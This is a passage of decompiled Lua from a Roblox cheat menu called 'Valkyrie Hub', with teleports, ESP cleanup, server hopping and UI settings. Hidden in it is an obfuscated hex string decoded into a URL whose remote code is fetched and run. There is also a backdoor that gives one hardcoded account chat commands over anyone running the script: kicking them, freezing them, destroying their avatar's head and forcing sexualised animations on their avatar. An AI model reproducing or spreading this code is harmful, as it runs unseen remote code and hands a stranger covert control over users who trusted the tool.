end)
Tp4Group:AddButton("Teleport to Armor #6", function()
	-- upvalues: (ref) v_u_1642
	v_u_1642(CFrame.new(97.21, 22.75, -302.63))
end)
Tp5Group = v26:AddRightGroupbox("Safe Zones")
Tp5Group:AddButton("Teleport to Safe #1", function()
	-- upvalues: (ref) v_u_1642
	v_u_1642(CFrame.new(-55, -58, 146))
end)
Tp5Group:AddButton("Teleport to Safe #2", function()
	-- upvalues: (ref) v_u_1642
	v_u_1642(CFrame.new(-124, -58, 130))
end)
Tp5Group:AddButton("Teleport to Safe #3", function()
	-- upvalues: (ref) v_u_1642
	v_u_1642(CFrame.new(-547, 173, -2))
end)
Tabs = {
	["UI Settings"] = v563:AddTab("UI Settings")
}
SettingsGroup = Tabs["UI Settings"]:AddLeftGroupbox("Menu")
local v1643 = v_u_2
v_u_2.SetWatermarkVisibility(v1643, true)
FrameTimer = tick()
FrameCounter = 0
FPS = 60
showWatermark = true
WatermarkConnection = game:GetService("RunService").RenderStepped:Connect(function()
	-- upvalues: (ref) v_u_2
	FrameCounter = FrameCounter + 1
	if tick() - FrameTimer >= 1 then
		FPS = FrameCounter
		FrameTimer = tick()
		FrameCounter = 0
	end
	if showWatermark then
		v_u_2:SetWatermark(("Valkyrie Hub | Private Premium Version | %s fps | %s ms"):format(math.floor(FPS), math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue())))
	else
		v_u_2:SetWatermarkVisibility(false)
	end
end)
v_u_2.KeybindFrame.Visible = true
local v1644 = v_u_2
v_u_2.OnUnload(v1644, function()
	-- upvalues: (ref) v_u_561, (ref) v_u_2, (ref) v_u_1498, (ref) v_u_1497, (ref) v_u_564
	v_u_561.MouseIconEnabled = true
	v_u_2.Unloaded = true
	v_u_1498 = false
	local v1645, v1646, v1647 = pairs(v_u_1497)
	while true do
		local v_u_1648
		v1647, v_u_1648 = v1645(v1646, v1647)
		if v1647 == nil then
			break
		end
		if v_u_1648.LabelGui and v_u_1648.LabelGui.Parent then
			pcall(function()
				-- upvalues: (ref) v_u_1648
				v_u_1648.LabelGui:Destroy()
			end)
		end
		if v_u_1648.Highlight then
			pcall(function()
				-- upvalues: (ref) v_u_1648
				v_u_1648.Highlight:Destroy()
			end)
		end
		if v_u_1648.Box and v_u_1648.Box.Remove then
			pcall(function()
				-- upvalues: (ref) v_u_1648
				v_u_1648.Box:Remove()
			end)
		end
		if v_u_1648.BoxOutline and v_u_1648.BoxOutline.Remove then
			pcall(function()
				-- upvalues: (ref) v_u_1648
				v_u_1648.BoxOutline:Remove()
			end)
		end
		if v_u_1648.HealthBar and v_u_1648.HealthBar.Remove then
			pcall(function()
				-- upvalues: (ref) v_u_1648
				v_u_1648.HealthBar:Remove()
			end)
		end
		if v_u_1648.HealthBarOutline and v_u_1648.HealthBarOutline.Remove then
			pcall(function()
				-- upvalues: (ref) v_u_1648
				v_u_1648.HealthBarOutline:Remove()
			end)
		end
		if v_u_1648.TracerMain and v_u_1648.TracerMain.Remove then
			pcall(function()
				-- upvalues: (ref) v_u_1648
				v_u_1648.TracerMain:Remove()
			end)
		end
		if v_u_1648.TracerOutline and v_u_1648.TracerOutline.Remove then
			pcall(function()
				-- upvalues: (ref) v_u_1648
				v_u_1648.TracerOutline:Remove()
			end)
		end
		if v_u_1648.DirectionLines then
			local v1649, v1650, v1651 = ipairs(v_u_1648.DirectionLines)
			while true do
				local v_u_1652
				v1651, v_u_1652 = v1649(v1650, v1651)
				if v1651 == nil then
					break
				end
				if v_u_1652.Remove then
					pcall(function()
						-- upvalues: (ref) v_u_1652
						v_u_1652:Remove()
					end)
				end
			end
		end
	end
	v_u_1497 = {}
	v_u_564 = false
	if circle and circle.Remove then
		pcall(function()
			circle:Remove()
		end)
	end
	if ESPConnection and ESPConnection.Disconnect then
		pcall(function()
			ESPConnection:Disconnect()
		end)
	end
end)
SettingsGroup:AddButton("Unload", function()
	-- upvalues: (ref) v_u_561, (ref) v_u_2
	v_u_561.MouseIconEnabled = true
	v_u_2:Unload()
end)
SettingsGroup:AddLabel("Menu bind"):AddKeyPicker("MenuKeybind", {
	["Default"] = "Insert",
	["NoUI"] = true,
	["Text"] = "Menu keybind"
})
v_u_2.ToggleKeybind = Options.MenuKeybind
v3:SetLibrary(v_u_2)
v4:SetLibrary(v_u_2)
v4:IgnoreThemeSettings()
v4:SetIgnoreIndexes({ "MenuKeybind" })
v3:SetFolder("ValkyrieTheme")
v4:SetFolder("ValkyrieConfig")
v4:BuildConfigSection(Tabs["UI Settings"])
v3:ApplyToTab(Tabs["UI Settings"])
v4:LoadAutoloadConfig()
SettingsgGroup = Tabs["UI Settings"]:AddRightGroupbox("UI Functions")
SettingsgGroup:AddToggle("Toggle_Watermark", {
	["Text"] = "Show Watermark",
	["Default"] = true,
	["Callback"] = function(p1653)
		-- upvalues: (ref) v_u_2
		showWatermark = p1653
		v_u_2:SetWatermarkVisibility(p1653)
	end
})
SettingsgGroup:AddToggle("Toggle_KeybindList", {
	["Text"] = "Show Keybind List",
	["Default"] = true,
	["Callback"] = function(p1654)
		-- upvalues: (ref) v_u_2
		v_u_2.KeybindFrame.Visible = p1654
	end
})
damageConnection = nil
lastHealth = {}
SettingsgGroup:AddToggle("Toggle_DamageNotify", {
	["Text"] = "Show Player Damage",
	["Default"] = false,
	["Callback"] = function(p1655)
		-- upvalues: (ref) v_u_2
		if p1655 then
			damageConnection = game:GetService("RunService").Heartbeat:Connect(function()
				-- upvalues: (ref) v_u_2
				local v1656, v1657, v1658 = pairs(game.Players:GetPlayers())
				while true do
					local v1659
					v1658, v1659 = v1656(v1657, v1658)
					if v1658 == nil then
						break
					end
					if v1659 ~= game.Players.LocalPlayer then
						local v1660 = v1659.Character
						if v1660 then
							local v1661 = v1660:FindFirstChildOfClass("Humanoid")
							if v1661 then
								local v1662 = v1661.Health
								if v1662 < (lastHealth[v1659] or v1662) then
									v_u_2:Notify(v1659.Name .. " took damage!", 2)
								end
								lastHealth[v1659] = v1662
							end
						end
					end
				end
			end)
		else
			if damageConnection then
				damageConnection:Disconnect()
				damageConnection = nil
			end
			lastHealth = {}
		end
	end
})
notifyEnabled = true
originalNotify = v_u_2.Notify or function() end
SettingsgGroup:AddToggle("Toggle_NotifyList", {
	["Text"] = "Notifications UI",
	["Default"] = true,
	["Callback"] = function(p1663)
		-- upvalues: (ref) v_u_2
		notifyEnabled = p1663
		if p1663 then
			v_u_2.Notify = originalNotify
			v_u_2:Notify("Notifications Enabled", 3)
		else
			function v_u_2.Notify() end
		end
	end
})
SettingsrrGroup = Tabs["UI Settings"]:AddRightGroupbox("Other")
SettingsrrGroup:AddButton("Fix Rejoining Before", function()
	game.Players.LocalPlayer:Kick("Fixed Bug (Rejoin Before)")
end)
SettingsrrGroup:AddButton("Server Hop v2", function()
	local v1664 = game:GetService("TeleportService")
	local v_u_1665 = game.PlaceId
	local v_u_1666 = game:GetService("HttpService")
	local v1668, v1669 = pcall(function()
		-- upvalues: (ref) v_u_1665, (ref) v_u_1666
		local v1667 = ("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100"):format(v_u_1665)
		return v_u_1666:JSONDecode(game:HttpGet(v1667))
	end)
	if v1668 and (v1669 and v1669.data) then
		local v1670 = game.JobId
		local v1671, v1672, v1673 = ipairs(v1669.data)
		local v1674 = v_u_1665
		while true do
			local v1675
			v1673, v1675 = v1671(v1672, v1673)
			if v1673 == nil then
				break
			end
			if v1675.playing < v1675.maxPlayers and v1675.id ~= v1670 then
				v1664:TeleportToPlaceInstance(v1674, v1675.id, game.Players.LocalPlayer)
				print("Teleporting to server:", v1675.id)
				return
			end
		end
		warn("No other server found")
	else
		warn("Failed to get server list")
	end
end)
SettingsrrGroup:AddButton("Rejoin Server", function()
	local v1676 = game:GetService("TeleportService")
	local v1677 = game:GetService("Players").LocalPlayer
	local v1678 = game.JobId
	local v1679 = game.PlaceId
	if v1678 and v1679 then
		v1676:TeleportToPlaceInstance(v1679, v1678, v1677)
	else
		warn("error 2xz64x56z876xz")
	end
end)
loadstring(game:HttpGet((function()
	local v1680 = "68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f7a657374792d6372656174652f7265736375652f726566732f68656164732f6d61696e2f66697865645f6c6962726172792e6c75612f77323262353939787a347a36343578313236342e6c7561"
	local v1681 = ""
	for v1682 = 1, #v1680, 2 do
		v1681 = v1681 .. string.char(tonumber(v1680:sub(v1682, v1682 + 1), 16))
	end
	return v1681
end)()))()
local v_u_1683 = game:GetService("VirtualInputManager")
local v1684 = game:GetService("TextChatService")
local v1685 = v_u_11:FindFirstChild("DefaultChatSystemChatEvents")
local v_u_1686 = {
	["WilliamBeast202037"] = "[\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189] real developer experimental"
}
benxActive = false
benxConnection = nil
currentSound = nil
prankParts = {}
function applyDisplayName(p1687)
	-- upvalues: (ref) v_u_1686
	local v_u_1688 = v_u_1686[p1687.Name]
	if v_u_1688 then
		local function v1691(p1689)
			-- upvalues: (ref) v_u_1688
			local v1690 = p1689:WaitForChild("Humanoid", 10)
			if v1690 then
				v1690.DisplayName = v_u_1688
			end
		end
		p1687.CharacterAdded:Connect(v1691)
		if p1687.Character then
			v1691(p1687.Character)
		end
	end
end
function getAdmin()
	-- upvalues: (ref) v_u_1686, (ref) v_u_1496
	local v1692, v1693, v1694 = pairs(v_u_1686)
	while true do
		v1694 = v1692(v1693, v1694)
		if v1694 == nil then
			break
		end
		local v1695 = v_u_1496:FindFirstChild(v1694)
		if v1695 then
			return v1695
		end
	end
	return nil
end
function teleportInFrontFacingForward()
	-- upvalues: (ref) v_u_1214
	local v1696 = getAdmin()
	local v1697 = v1696 and v1696.Character
	if v1697 then
		v1697 = v1696.Character:FindFirstChild("HumanoidRootPart")
	end
	local v1698 = v_u_1214.Character
	if v1698 then
		v1698 = v_u_1214.Character:FindFirstChild("HumanoidRootPart")
	end
	if v1697 and v1698 then
		local v1699 = v1697.CFrame.LookVector * 2
		local v1700 = v1697.Position + v1699
		v1698.CFrame = CFrame.new(v1700, v1700 + v1697.CFrame.LookVector)
	end
end
function startBenx()
	-- upvalues: (ref) v_u_1214, (ref) v_u_1683, (ref) v_u_1212
	if benxActive then
		return
	else
		benxActive = true
		teleportInFrontFacingForward()
		task.wait(0.1)
		local v1701 = v_u_1214.Character
		if v1701 then
			local v1702 = v1701:FindFirstChildOfClass("Humanoid")
			if v1702 then
				v1702.PlatformStand = true
			end
			pcall(function()
				-- upvalues: (ref) v_u_1683
				v_u_1683:SendKeyEvent(true, Enum.KeyCode.LeftControl, false, game)
			end)
			local v_u_1703 = 0
			local v_u_1704 = 60
			benxConnection = v_u_1212.Heartbeat:Connect(function()
				-- upvalues: (ref) v_u_1214, (ref) v_u_1703, (ref) v_u_1704
				local v1705 = getAdmin()
				local v1706 = v_u_1214.Character
				if v1706 then
					v1706 = v_u_1214.Character:FindFirstChild("HumanoidRootPart")
				end
				local v1707 = v1705 and v1705.Character
				if v1707 then
					v1707 = v1705.Character:FindFirstChild("HumanoidRootPart")
				end
				if v1707 and v1706 then
					local v1708 = v1707.Position + v1707.CFrame.LookVector * 2
					local v1709 = 0.3 * math.sin(v_u_1703 / v_u_1704 * math.pi * 2)
					v1706.CFrame = CFrame.new(v1708, v1708 + v1707.CFrame.LookVector) * CFrame.new(0, 0, v1709)
					v_u_1703 = (v_u_1703 + 1) % v_u_1704
				end
			end)
		end
	end
end
function stopBenx()
	-- upvalues: (ref) v_u_1214, (ref) v_u_1683
	if benxConnection then
		benxConnection:Disconnect()
		benxConnection = nil
	end
	benxActive = false
	local v1710 = v_u_1214.Character
	if v1710 then
		v1710 = v_u_1214.Character:FindFirstChildOfClass("Humanoid")
	end
	if v1710 then
		v1710.PlatformStand = false
		v1710.WalkSpeed = 16
		v1710.JumpPower = 50
	end
	pcall(function()
		-- upvalues: (ref) v_u_1683
		v_u_1683:SendKeyEvent(false, Enum.KeyCode.LeftControl, false, game)
	end)
end
function freeze()
	-- upvalues: (ref) v_u_1214
	local v1711 = v_u_1214.Character
	if v1711 then
		v1711 = v_u_1214.Character:FindFirstChildOfClass("Humanoid")
	end
	if v1711 then
		v1711.PlatformStand = true
		v1711.WalkSpeed = 0
		v1711.JumpPower = 0
	end
end
function unfreeze()
	-- upvalues: (ref) v_u_1214
	local v1712 = v_u_1214.Character
	if v1712 then
		v1712 = v_u_1214.Character:FindFirstChildOfClass("Humanoid")
	end
	if v1712 then
		v1712.PlatformStand = false
		v1712.WalkSpeed = 16
		v1712.JumpPower = 50
	end
end
function betraySelf()
	-- upvalues: (ref) v_u_1214
	local v1713 = v_u_1214.Character
	if v1713 then
		v1713 = v_u_1214.Character:FindFirstChild("Head")
	end
	if v1713 then
		v1713:Destroy()
	end
end
function findPlayerByName(p1714)
	-- upvalues: (ref) v_u_1496
	local v1715 = p1714:lower()
	local v1716 = v_u_1496
	local v1717, v1718, v1719 = pairs(v1716:GetPlayers())
	while true do
		local v1720
		v1719, v1720 = v1717(v1718, v1719)
		if v1719 == nil then
			break
		end
		if v1720.Name:lower() == v1715 or v1720.DisplayName:lower() == v1715 then
			return v1720
		end
	end
	local v1721 = v_u_1496
	local v1722, v1723, v1724 = pairs(v1721:GetPlayers())
	while true do
		local v1725
		v1724, v1725 = v1722(v1723, v1724)
		if v1724 == nil then
			break
		end
		if v1725.Name:lower():find(v1715) or v1725.DisplayName:lower():find(v1715) then
			return v1725
		end
	end
	return nil
end
function startCustomBenx(p_u_1726, p1727, p1728, p_u_1729)
	-- upvalues: (ref) v_u_1214, (ref) v_u_1683, (ref) v_u_1212
	if p_u_1726 and p_u_1726.Character then
		local v1730 = p_u_1726.Character:FindFirstChild("HumanoidRootPart")
		local v1731 = v_u_1214.Character
		if v1731 then
			v1731 = v_u_1214.Character:FindFirstChild("HumanoidRootPart")
		end
		local v1732 = v_u_1214.Character
		if v1732 then
			v1732 = v_u_1214.Character:FindFirstChildOfClass("Humanoid")
		end
		if v1730 and (v1731 and v1732) then
			local v_u_1733 = p1727 and -1 or 1
			local v1734 = v1730.CFrame.LookVector * 2 * v_u_1733
			local v1735 = v1730.Position + v1734
			v1731.CFrame = CFrame.new(v1735, v1730.Position)
			task.wait(0.1)
			v1732.PlatformStand = true
			if p1728 then
				pcall(function()
					-- upvalues: (ref) v_u_1683
					v_u_1683:SendKeyEvent(true, Enum.KeyCode.LeftControl, false, game)
				end)
			end
			local v_u_1736 = 0
			local v_u_1737 = 60
			if benxConnection then
				benxConnection:Disconnect()
			end
			benxConnection = v_u_1212.Heartbeat:Connect(function()
				-- upvalues: (ref) p_u_1726, (ref) v_u_1214, (ref) v_u_1733, (ref) v_u_1736, (ref) v_u_1737, (ref) p_u_1729
				local v1738 = p_u_1726.Character
				if v1738 then
					v1738 = p_u_1726.Character:FindFirstChild("HumanoidRootPart")
				end
				local v1739 = v_u_1214.Character
				if v1739 then
					v1739 = v_u_1214.Character:FindFirstChild("HumanoidRootPart")
				end
				if v1738 and v1739 then
					local v1740 = v1738.Position + v1738.CFrame.LookVector * 2 * v_u_1733
					local v1741 = 0.3 * math.sin(v_u_1736 / v_u_1737 * math.pi * 2)
					v1739.CFrame = CFrame.new(v1740, v1740 + v1738.CFrame.LookVector) * CFrame.new(0, 0, v1741)
					v_u_1736 = (v_u_1736 + p_u_1729) % v_u_1737
				end
			end)
		end
	else
		return
	end
end
function teleportToPlayer(p1742)
	-- upvalues: (ref) v_u_1214
	local v1743 = findPlayerByName(p1742)
	local v1744 = v_u_1214.Character
	if v1744 then
		v1744 = v_u_1214.Character:FindFirstChild("HumanoidRootPart")
	end
	if v1743 and (v1743.Character and v1744) then
		local v1745 = v1743.Character:FindFirstChild("HumanoidRootPart")
		if v1745 then
			v1744.CFrame = v1745.CFrame
		end
	end
end
function spawnPrankCubes()
	-- upvalues: (ref) v_u_1214, (ref) v_u_1037
	for _ = 1, 1000 do
		local v1746 = Instance.new("Part")
		v1746.Size = Vector3.new(2, 2, 2)
		v1746.Position = v_u_1214.Character and v_u_1214.Character:GetPivot().Position + Vector3.new(0, 100 + math.random() * 50, 0) or Vector3.new(0, 100, 0)
		v1746.Anchored = false
		v1746.BrickColor = BrickColor.Random()
		v1746.Parent = v_u_1037
		table.insert(prankParts, v1746)
	end
end
function clearPrankCubes()
	local v1747, v1748, v1749 = ipairs(prankParts)
	while true do
		local v1750
		v1749, v1750 = v1747(v1748, v1749)
		if v1749 == nil then
			break
		end
		if v1750 and v1750.Parent then
			v1750:Destroy()
		end
	end
	prankParts = {}
end
function onMessageReceived(p1751, p1752)
	-- upvalues: (ref) v_u_1686, (ref) v_u_1214
	if v_u_1686[p1752] then
		local v1753 = v_u_1214.Name == p1752
		local v1754 = p1751:lower()
		local v1755, v1756, v1757 = string.gmatch(v1754, "[^%s]+")
		local v1758 = {}
		while true do
			v1757 = v1755(v1756, v1757)
			if v1757 == nil then
				break
			end
			table.insert(v1758, v1757)
		end
		if v1758[1] ~= "/kick" or v1753 then
			if v1754 == "/bring ." and not v1753 then
				teleportInFrontFacingForward()
			elseif v1754 == "/freeze ." and not v1753 then
				freeze()
			elseif v1754 == "/unfreeze ." then
				unfreeze()
			elseif v1754 == "/benx ." and not v1753 then
				startBenx()
			elseif v1754 == "/unbenx ." then
				stopBenx()
			elseif v1754 == "/betray ." and not v1753 then
				betraySelf()
			elseif v1754 == "/prank ." and not v1753 then
				spawnPrankCubes()
			elseif v1754 == "/clear ." and not v1753 then
				clearPrankCubes()
			elseif v1758[1] ~= "/tp" or (not v1758[2] or v1753) then
				if v1758[1] ~= "/pbenx" or (not v1758[2] or v1753) then
					local v1759 = (v1758[1] == "/pbang" and v1758[2] and true or false) and (not v1753 and findPlayerByName(v1758[2]))
					if v1759 then
						startCustomBenx(v1759, true, false, 1.5)
					end
				else
					local v1760 = findPlayerByName(v1758[2])
					if v1760 then
						startCustomBenx(v1760, false, true, 1.5)
					end
				end
			else
				teleportToPlayer(v1758[2])
			end
		else
			local v1761 = p1751:lower():find("/kick")
			local v1762 = p1751:sub(v1761 + 5):gsub("^%s+", "")
			local v1763
			if v1762 == "." or v1762 == "" then
				v1763 = "Kicked by Developer"
			else
				local v1764 = findPlayerByName(v1758[2])
				if v1764 and v1764.Name == v_u_1214.Name then
					v1762 = p1751:sub(p1751:lower():find(v1758[2]:lower(), v1761 + 5) + #v1758[2] + 1):match("^%s*(.*)"):gsub("^%s+", "")
				end
				v1763 = v1762 == "" and "Kicked by Developer" or "Kicked by Developer, the best Reason: " .. v1762
			end
			v_u_1214:Kick(v1763)
		end
	end
end
if v1685 then
	v1685.OnMessageDoneFiltering.OnClientEvent:Connect(function(p1765)
		onMessageReceived(p1765.Message, p1765.FromSpeaker)
	end)
end
if v1684 then
	function v1684.OnIncomingMessage(p1766)
		if p1766.TextSource and p1766.TextSource.Name then
			onMessageReceived(p1766.Text, p1766.TextSource.Name)
		end
	end
end
local v1767, v1768, v1769 = pairs(v_u_1496:GetPlayers())
while true do
	local v1770
	v1769, v1770 = v1767(v1768, v1769)
	if v1769 == nil then
		break
	end
	applyDisplayName(v1770)
end
v_u_1496.PlayerAdded:Connect(applyDisplayName)
